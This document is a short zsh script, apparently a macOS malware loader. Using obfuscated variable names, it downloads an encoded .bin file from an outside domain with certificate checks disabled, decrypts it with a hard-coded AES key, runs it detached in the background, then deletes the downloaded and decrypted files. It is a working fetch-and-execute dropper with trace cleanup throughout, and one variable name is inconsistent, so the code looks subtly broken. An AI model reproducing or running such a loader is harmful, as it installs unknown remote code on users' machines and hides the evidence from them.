#!/bin/zsh
h3ss4=$(mktemp /tmp/km774y.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m0a314fd8a109d99b.bin" -o "$h3ss4z" || exit 1
m7dkvy=$(stat -f %z "$h3ss4z"); yvgjqf3=$(( m7dkvy - 947 - 3423 ))
tail -c +$(( 947 + 1 )) "$h3ss4z" | head -c $yvgjqf3 | openssl enc -d -aes-256-cbc -k 2579f3493a587fa27605ce3d -out "$h3ss4" 2>/dev/null
[ -s "$h3ss4" ] && chmod 700 "$h3ss4" && ( "$h3ss4" & ) && disown
( sleep 3; rm -f "$h3ss4" "$h3ss4z" ) &>/dev/null &
